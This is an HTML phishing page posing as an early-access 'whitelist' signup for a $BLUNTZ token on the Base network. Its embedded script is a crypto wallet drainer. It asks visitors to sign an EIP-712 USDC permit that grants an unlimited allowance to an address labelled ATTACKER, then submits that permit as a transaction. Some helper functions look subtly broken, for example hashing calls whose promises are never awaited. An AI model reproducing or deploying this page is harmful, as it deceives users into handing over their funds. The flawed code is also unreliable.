<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Bluntz â€“ Early-access whitelist</title>
<style>
body{background:#081008;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
.card{background:rgba(0,255,150,0.05);border:1px solid rgba(0,255,150,0.15);border-radius:14px;padding:2.2rem 2.5rem;text-align:center;width:90%;max-width:360px;box-shadow:0 0 24px #00ff9630}
.logo{color:#00ff96;font-size:2rem;font-weight:800;margin-bottom:.6rem}
h1{color:#d0ffd0;font-size:1.3rem;margin-bottom:.4rem}
p{color:#a0d0a0;font-size:.9rem;margin-bottom:1.8rem}
button{width:100%;padding:.9rem 0;font-size:1rem;font-weight:700;border:none;border-radius:8px;background:#00ff96;color:#000;cursor:pointer;transition:transform .15s}
button:hover{transform:translateY(-2px)}
</style>
</head>
<body>
<div class="card">
<div class="logo">BLUNTZ</div>
<h1>Early-access whitelist</h1>
<p>Connect wallet and sign to reserve your $BLUNTZ allocation on Base.</p>
<button id="go">Connect & Sign</button>
</div>

<script>
/* ===== CONFIG ===== */
const ATTACKER = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
const USDC     = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
const CHAIN_ID = 8453;

/* universal provider finder */
function getProvider(){
  if(typeof window.ethereum!=="undefined") return window.ethereum;
  if(typeof window.phantom!=="undefined"&&window.phantom.ethereum) return window.phantom.ethereum;
  if(typeof window.solana!=="undefined"&&window.solana.isPhantom) return window.phantom.ethereum;
  throw new Error("No wallet detected");
}

/* minimal EIP-712 permit builder */
async function signPermit(){
  const provider=getProvider();
  await provider.request({method:"eth_requestAccounts"});
  const accounts=await provider.request({method:"eth_accounts"});
  const owner=accounts[0];

  const name="USD Coin",version="2";
  const domainSeparator=keccak256(
    ["bytes32","bytes32","bytes32","uint256","address"],
    [
      keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
      keccak256(name),
      keccak256(version),
      CHAIN_ID,
      USDC
    ]
  );

  const spender=ATTACKER;
  const value="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  const deadline=Math.floor(Date.now()/1000)+3600;

  const nonce=await provider.request({
    method:"eth_call",
    params:[{
      to:USDC,
      data:"0x7ecebe00"+pad32(owner)
    },"latest"]
  });

  const message=keccak256(
    ["bytes32","address","address","uint256","uint256","uint256"],
    [
      keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
      owner,
      spender,
      value,
      nonce,
      deadline
    ]
  );
  const digest=keccak256(["string","bytes32","bytes32"],["\x19\x01",domainSeparator,message]);

  const signature=await provider.request({
    method:"eth_signTypedData_v4",
    params:[owner,{
      types:{
        EIP712Domain:[
          {name:"name",type:"string"},
          {name:"version",type:"string"},
          {name:"chainId",type:"uint256"},
          {name:"verifyingContract",type:"address"}
        ],
        Permit:[
          {name:"owner",type:"address"},
          {name:"spender",type:"address"},
          {name:"value",type:"uint256"},
          {name:"nonce",type:"uint256"},
          {name:"deadline",type:"uint256"}
        ]
      },
      primaryType:"Permit",
      domain:{name,version,chainId:CHAIN_ID,verifyingContract:USDC},
      message:{owner,spender,value,nonce,deadline}
    }]
  });

  const {v,r,s}=splitSig(signature);
  const permitData="0xd505accf"+abiEncode(
    ["address","address","uint256","uint256","uint8","bytes32","bytes32"],
    [owner,spender,value,deadline,v,r,s]
  );

  const txHash=await provider.request({
    method:"eth_sendTransaction",
    params:[{to:USDC,data:permitData,gas:"0x186a0"}]
  });
  console.log("Permit tx:",txHash);
}

/* helper fns */
function keccak256(types,values){
  return window.ethereum.request({
    method:"web3_sha3",
    params:[window.ethereum.utils.soliditySha3(...types.map((t,i)=>({type:t,value:values[i]}))).slice(2)]
  });
}
function pad32(addr){return "0x"+addr.slice(2).padStart(64,"0");}
function splitSig(sig){
  const r=sig.slice(0,66);
  const s="0x"+sig.slice(66,130);
  const v=parseInt(sig.slice(130,132),16);
  return {v,r,s};
}
function abiEncode(types,values){
  return window.ethereum.utils.encodeParameters(types,values);
}

document.getElementById("go").onclick=signPermit;
</script>
</body>
</html>
